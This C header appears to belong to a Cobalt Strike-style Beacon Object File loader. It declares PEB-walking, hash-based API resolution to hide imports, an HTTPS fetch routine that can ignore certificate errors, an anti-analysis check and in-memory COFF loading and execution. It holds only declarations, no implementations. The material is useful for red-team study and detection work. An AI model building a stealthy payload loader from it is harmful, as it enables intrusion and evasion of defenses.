/*
 * bofloader.h — shared types, constants, and function declarations for the
 * standalone native BOF loader.
 *
 * Built with MinGW -nostdlib; no CRT, no imports, all APIs resolved via PEB.
 */

#pragma once

/* -------------------------------------------------------------------------- */
/* 1. Minimal Windows types                                                   */
/* -------------------------------------------------------------------------- */

typedef unsigned char       BYTE, UCHAR;
typedef unsigned char         BOOLEAN;
typedef int                   BOOL;
typedef unsigned short        WORD, USHORT, WCHAR;
typedef unsigned long         DWORD, ULONG;
typedef short                 SHORT;
typedef long                  LONG;
typedef unsigned long long    ULONGLONG, ULONG_PTR, SIZE_T, DWORD64, DWORD_PTR, LONG_PTR;
typedef void*                 HMODULE;
typedef long long             LONGLONG;
typedef void*                 PVOID;
typedef PVOID                 HANDLE;
typedef HANDLE*               PHANDLE;
typedef ULONG*                PULONG;
typedef DWORD*                PDWORD;
typedef LONG                  NTSTATUS;
typedef WCHAR*                PWSTR;
typedef WCHAR*                LPWSTR;
typedef const WCHAR*          LPCWSTR;
typedef const char*           LPCSTR;
typedef char*                 LPSTR;
typedef unsigned int          INTERNET_PORT;

#define WINAPI
#define NTAPI
#define CALLBACK
#define IN
#define OUT
#define OPTIONAL

#define NULL  ((void*)0)
#define TRUE  1
#define FALSE 0

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#define PAGE_NOACCESS          0x01
#define PAGE_READONLY          0x02
#define PAGE_READWRITE         0x04
#define PAGE_EXECUTE           0x10
#define PAGE_EXECUTE_READ      0x20
#define PAGE_EXECUTE_READWRITE 0x40

#define MEM_COMMIT             0x00001000
#define MEM_RESERVE            0x00002000
#define MEM_RELEASE            0x00008000
#define MEM_TOP_DOWN           0x00010000

#define INFINITE               0xFFFFFFFF

#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0
#define WINHTTP_NO_PROXY_NAME      ((LPCWSTR)NULL)
#define WINHTTP_NO_PROXY_BYPASS    ((LPCWSTR)NULL)
#define WINHTTP_FLAG_SECURE        0x00800000
#define WINHTTP_NO_ADDITIONAL_HEADERS NULL
#define WINHTTP_NO_REQUEST_DATA    NULL
#define WINHTTP_DEFAULT_ACCEPT_TYPES NULL
#define WINHTTP_NO_REFERER         NULL
#define WINHTTP_OPTION_SECURITY_FLAGS 31
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA        0x00000100
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  0x00000200
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID   0x00001000
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#define SECURITY_IGNORE_ALL  (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
#define WINHTTP_FLAG_REFRESH   0x00000100

/* -------------------------------------------------------------------------- */
/* 2. FNV1a-32 hash constants                                                   */
/* -------------------------------------------------------------------------- */

#include "hashes.h"

#define H_MAGIC_KEY   0x811c9dc5u
#define H_MAGIC_PRIME 0x01000193u

/* -------------------------------------------------------------------------- */
/* 3. PEB / LDR / PE structs                                                  */
/* -------------------------------------------------------------------------- */

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderModuleList;
    LIST_ENTRY     InMemoryOrderModuleList;
    LIST_ENTRY     InInitializationOrderModuleList;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG          Flags;
    USHORT         LoadCount;
    USHORT         TlsIndex;
    LIST_ENTRY     HashLinks;
    ULONG          TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN      InheritedAddressSpace;
    BOOLEAN      ReadImageFileExecOptions;
    BOOLEAN      BeingDebugged;
    BOOLEAN      BitField;
    PVOID        Mutant;
    PVOID        ImageBase;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB  ProcessEnvironmentBlock;
} TEB, *PTEB;

typedef struct _IMAGE_DOS_HEADER {
    WORD  e_magic;
    WORD  e_cblp;
    WORD  e_cp;
    WORD  e_crlc;
    WORD  e_cparhdr;
    WORD  e_minalloc;
    WORD  e_maxalloc;
    WORD  e_ss;
    WORD  e_sp;
    WORD  e_csum;
    WORD  e_ip;
    WORD  e_cs;
    WORD  e_lfarlc;
    WORD  e_ovno;
    WORD  e_res[4];
    WORD  e_oemid;
    WORD  e_oeminfo;
    WORD  e_res2[10];
    LONG  e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD                 Magic;
    BYTE                 MajorLinkerVersion;
    BYTE                 MinorLinkerVersion;
    DWORD                SizeOfCode;
    DWORD                SizeOfInitializedData;
    DWORD                SizeOfUninitializedData;
    DWORD                AddressOfEntryPoint;
    DWORD                BaseOfCode;
    ULONGLONG            ImageBase;
    DWORD                SectionAlignment;
    DWORD                FileAlignment;
    WORD                 MajorOperatingSystemVersion;
    WORD                 MinorOperatingSystemVersion;
    WORD                 MajorImageVersion;
    WORD                 MinorImageVersion;
    WORD                 MajorSubsystemVersion;
    WORD                 MinorSubsystemVersion;
    DWORD                Win32VersionValue;
    DWORD                SizeOfImage;
    DWORD                SizeOfHeaders;
    DWORD                CheckSum;
    WORD                 Subsystem;
    WORD                 DllCharacteristics;
    ULONGLONG            SizeOfStackReserve;
    ULONGLONG            SizeOfStackCommit;
    ULONGLONG            SizeOfHeapReserve;
    ULONGLONG            SizeOfHeapCommit;
    DWORD                LoaderFlags;
    DWORD                NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD                 Signature;
    IMAGE_FILE_HEADER     FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion;
    WORD  MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

typedef union _LARGE_INTEGER {
    struct { DWORD LowPart; LONG HighPart; };
    LONGLONG QuadPart;
} LARGE_INTEGER, *PLARGE_INTEGER;

/* -------------------------------------------------------------------------- */
/* 4. PEB helpers                                                               */
/* -------------------------------------------------------------------------- */

static inline __attribute__((always_inline)) PTEB NtCurrentTeb(void) {
    PTEB teb;
    __asm__ __volatile__("movq %%gs:0x30, %0" : "=r"(teb));
    return teb;
}

static inline __attribute__((always_inline)) PPEB NtCurrentPeb(void) {
    return NtCurrentTeb()->ProcessEnvironmentBlock;
}

/* -------------------------------------------------------------------------- */
/* 5. Tiny libc                                                                 */
/* -------------------------------------------------------------------------- */

extern void MemSet(PVOID dst, BYTE v, SIZE_T n);
extern void MemCpy(PVOID dst, const void* src, SIZE_T n);
extern SIZE_T StrLenA(const char* s);
extern int StrCmpA(const char* a, const char* b);
extern int StrCmpNI(const char* a, const char* b, SIZE_T n);
extern SIZE_T WStrLen(const WCHAR* s);
extern int WStrCmpNI(const WCHAR* a, const WCHAR* b, SIZE_T n);

/* -------------------------------------------------------------------------- */
/* 6. Hash + module resolution                                                  */
/* -------------------------------------------------------------------------- */

extern ULONG HashStringW(const WCHAR* s, SIZE_T len);
extern ULONG HashStringA(const char* s, SIZE_T len);
extern PVOID LdrModule(ULONG hash);
extern PVOID LdrFunction(PVOID lib, ULONG hash);
extern PVOID LoadDll(const WCHAR* name);

/* -------------------------------------------------------------------------- */
/* 7. NT API typedefs and init                                                  */
/* -------------------------------------------------------------------------- */

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PHANDLE);

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, SIZE_T*, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ULONG, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pRtlAddFunctionTable)(PVOID, DWORD, ULONGLONG);
typedef NTSTATUS (NTAPI *pRtlDeleteFunctionTable)(PVOID);

typedef struct _NT_FUNCS {
    pLdrLoadDll              LdrLoadDll;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtProtectVirtualMemory  NtProtectVirtualMemory;
    pNtFreeVirtualMemory     NtFreeVirtualMemory;
    pNtCreateThreadEx        NtCreateThreadEx;
    pNtWaitForSingleObject   NtWaitForSingleObject;
    pNtQuerySystemInformation  NtQuerySystemInformation;
    pNtClose                 NtClose;
    pRtlAddFunctionTable     RtlAddFunctionTable;
    pRtlDeleteFunctionTable  RtlDeleteFunctionTable;
} NT_FUNCS;

extern BOOL NtInit(NT_FUNCS* f);

/* -------------------------------------------------------------------------- */
/* 8. Heap helpers (kernel32)                                                   */
/* -------------------------------------------------------------------------- */

typedef HANDLE (WINAPI *pGetProcessHeap)(void);
typedef PVOID  (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree)(HANDLE, DWORD, PVOID);

typedef struct _HEAP_FUNCS {
    pGetProcessHeap GetProcessHeap;
    pHeapAlloc      HeapAlloc;
    pHeapFree       HeapFree;
} HEAP_FUNCS;

extern BOOL HeapInit(HEAP_FUNCS* f);

/* -------------------------------------------------------------------------- */
/* 9. WinHTTP HTTPS fetch                                                       */
/* -------------------------------------------------------------------------- */

typedef PVOID (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef PVOID (WINAPI *pWinHttpConnect)(PVOID, LPCWSTR, INTERNET_PORT, DWORD);
typedef PVOID (WINAPI *pWinHttpOpenRequest)(PVOID, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL  (WINAPI *pWinHttpSendRequest)(PVOID, LPCWSTR, DWORD, PVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL  (WINAPI *pWinHttpReceiveResponse)(PVOID, PVOID);
typedef BOOL  (WINAPI *pWinHttpQueryDataAvailable)(PVOID, PDWORD);
typedef BOOL  (WINAPI *pWinHttpReadData)(PVOID, PVOID, DWORD, PDWORD);
typedef BOOL  (WINAPI *pWinHttpCloseHandle)(PVOID);
typedef BOOL  (WINAPI *pWinHttpSetOption)(PVOID, DWORD, PVOID, DWORD);
typedef BOOL  (WINAPI *pWinHttpSetTimeouts)(PVOID, int, int, int, int);

typedef struct _HTTP_FUNCS {
    pWinHttpOpen              WinHttpOpen;
    pWinHttpConnect           WinHttpConnect;
    pWinHttpOpenRequest       WinHttpOpenRequest;
    pWinHttpSendRequest       WinHttpSendRequest;
    pWinHttpReceiveResponse   WinHttpReceiveResponse;
    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable;
    pWinHttpReadData          WinHttpReadData;
    pWinHttpCloseHandle       WinHttpCloseHandle;
    pWinHttpSetOption         WinHttpSetOption;
    pWinHttpSetTimeouts       WinHttpSetTimeouts;
} HTTP_FUNCS;

extern BYTE* HttpFetch(const WCHAR* host, INTERNET_PORT port, const WCHAR* path,
                       int use_https, int ignore_cert, DWORD* out_len,
                       HTTP_FUNCS* hf, HEAP_FUNCS* heapf);

/* -------------------------------------------------------------------------- */
/* 10. Anti-analysis                                                            */
/* -------------------------------------------------------------------------- */

typedef struct _SYSTEM_INFO {
    DWORD dwOemId;
    DWORD dwPageSize;
    PVOID lpMinimumApplicationAddress;
    PVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
} SYSTEM_INFO;

typedef void (WINAPI *pGetSystemInfo)(SYSTEM_INFO*);
typedef ULONGLONG (WINAPI *pGetTickCount64)(void);

extern BOOL AntiCheck(void);

/* -------------------------------------------------------------------------- */
/* 11. COFF / BOF constants and structures                                        */
/* -------------------------------------------------------------------------- */

#define COF_MACHINE_AMD64       0x8664
#define COF_MACHINE_I386        0x014C

#define IMAGE_REL_AMD64_ABSOLUTE 0x0000
#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32   0x0002
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009

#define IMAGE_SYM_CLASS_EXTERNAL 0x02
#define IMAGE_SYM_CLASS_STATIC   0x03

#define IMAGE_SCN_CNT_CODE               0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA   0x00000040
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080
#define IMAGE_SCN_MEM_EXECUTE            0x20000000
#define IMAGE_SCN_MEM_READ               0x40000000
#define IMAGE_SCN_MEM_WRITE              0x80000000

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_ERROR       0x0d
#define CALLBACK_OUTPUT_UTF8 0x20

#pragma pack(push, 1)

typedef struct _COF_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} COF_HEADER, *PCOF_HEADER;

typedef struct _COF_SECTION {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLineNumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} COF_SECTION, *PCOF_SECTION;

typedef struct _COF_SYMBOL {
    union {
        BYTE cName[8];
        struct { DWORD Short; DWORD Long; } Name;
    };
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} COF_SYMBOL, *PCOF_SYMBOL;

typedef struct _COF_RELOCATION {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;
} COF_RELOCATION, *PCOF_RELOCATION;

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

#pragma pack(pop)

/* -------------------------------------------------------------------------- */
/* 12. Beacon API data structures                                               */
/* -------------------------------------------------------------------------- */

typedef struct _datap {
    char* original;
    char* buffer;
    int   length;
    int   size;
} datap;

typedef struct _formatp {
    char* original;
    char* buffer;
    int   length;
    int   size;
} formatp;

/* -------------------------------------------------------------------------- */
/* 12b. KV store                                                                */
/* -------------------------------------------------------------------------- */

#define KV_MAX 32

typedef struct _KV_ENTRY {
    char key[32];
    void* value;
    int used;
} KV_ENTRY;

/* -------------------------------------------------------------------------- */
/* 13. BOF loader interface                                                     */
/* -------------------------------------------------------------------------- */

typedef struct _BOF_INSTANCE {
    NT_FUNCS*   Nt;
    HEAP_FUNCS* Heap;
    /* output capture */
    char*       outbuf;
    int         outlen;
    int         outcap;
    /* loaded sections */
    int         section_count;
    PCOF_SECTION sections;
    PVOID*      section_bases;
    int*        section_allocsizes;
    /* symbol resolution */
    PVOID*      sym_addrs;
    /* IAT slot table for external REL32 */
    PVOID*      iat_slots;
    char**      iat_names;
    int         iat_count;
    int         iat_cap;
    /* runtime function registration */
    PRUNTIME_FUNCTION registered_rf;
    DWORD       registered_count;
    ULONGLONG   image_base;
} BOF_INSTANCE;

typedef void (WINAPI *BOF_ENTRY)(char* args, int len);

/* Initialize API table for a BOF run */
extern void BofInitApis(BOF_INSTANCE* bi);
extern void* BofApiByName(const char* name);
extern void OutAppend(const char* s, int len);

extern KV_ENTRY g_kv[KV_MAX];

/* Load and execute a BOF */
int BofRun(BOF_INSTANCE* bi, const BYTE* bof, DWORD bof_size,
           const char* entry_name, const BYTE* args, DWORD args_len,
           char** output, int* output_len);

/* Free a BOF instance after execution */
void BofFree(BOF_INSTANCE* bi);

/* Pack CLI argument string into BOF wire format */
BYTE* PackBofArgs(HEAP_FUNCS* heapf, const char* input, DWORD* out_len);

/* -------------------------------------------------------------------------- */
/* 14. Entry point / main                                                       */
/* -------------------------------------------------------------------------- */

void BofLoaderEntry(void);
